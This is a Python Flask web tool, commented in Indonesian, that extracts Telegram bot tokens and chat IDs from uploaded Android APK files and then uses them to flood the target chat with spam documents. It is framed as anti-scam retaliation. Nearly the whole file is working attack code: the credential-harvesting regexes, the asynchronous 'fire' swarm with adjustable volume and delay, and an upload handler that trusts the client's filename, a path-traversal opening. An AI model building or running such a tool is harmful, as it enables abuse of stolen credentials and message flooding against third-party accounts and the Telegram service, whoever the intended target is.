import os
import re
import asyncio
import aiohttp
from flask import Flask, render_template, request, jsonify
from pyaxmlparser import APK

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# --- ENGINE SCANNER ---
def extract_credentials(apk_path):
    try:
        apk_obj = APK(apk_path)
        # Scan manifest & strings untuk mencari jejak bot
        content = apk_obj.get_android_manifest_xml().decode('utf-8', errors='ignore')
        
        # Regex Pro: Mencari Token & Chat ID
        tokens = list(set(re.findall(r'[0-9]{9,10}:[a-zA-Z0-9_-]{35}', content)))
        ids = list(set(re.findall(r'(?<!:)\b[0-9]{7,11}\b', content)))
        
        return {"tokens": tokens, "ids": ids}
    except Exception as e:
        return {"error": str(e)}

# --- ENGINE ATTACK (ASYNCHRONOUS) ---
async def attack_task(session, token, chat_id, media_url, attack_id):
    # Menggunakan sendDocument agar bisa kirim file apa pun sebagai spam
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    data = {
        'chat_id': chat_id,
        'document': media_url,
        'caption': f"⚠️ ANTI-SCAM ALERT #{attack_id}\nBERHENTI MENIPU RAKYAT!"
    }
    try:
        async with session.post(url, data=data, timeout=10) as resp:
            return resp.status
    except:
        return 500

@app.route('/')
def dashboard():
    return render_template('index.html')

@app.route('/scan', methods=['POST'])
def scan_apk():
    if 'file' not in request.files:
        return jsonify({"error": "No file uploaded"})
    
    file = request.files['file']
    file_path = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(file_path)
    
    results = extract_credentials(file_path)
    os.remove(file_path) # Self-destruct file setelah scan
    return jsonify(results)

@app.route('/fire', methods=['POST'])
def fire_attack():
    params = request.json
    token = params.get('token')
    chat_id = params.get('chat_id')
    media_url = params.get('media_url')
    amount = int(params.get('amount', 10))
    delay = float(params.get('delay', 0.1))

    async def run_swarm():
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(1, amount + 1):
                tasks.append(attack_task(session, token, chat_id, media_url, i))
                await asyncio.sleep(delay)
            return await asyncio.gather(*tasks)

    # Menjalankan event loop untuk serangan
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    results = loop.run_until_complete(run_swarm())
    
    return jsonify({
        "total": len(results),
        "success": results.count(200),
        "rate_limit": results.count(429)
    })

if __name__ == '__main__':
    # Jalan di semua interface (bisa diakses via IP Local/VPN)
    app.run(host='0.0.0.0', port=5000)
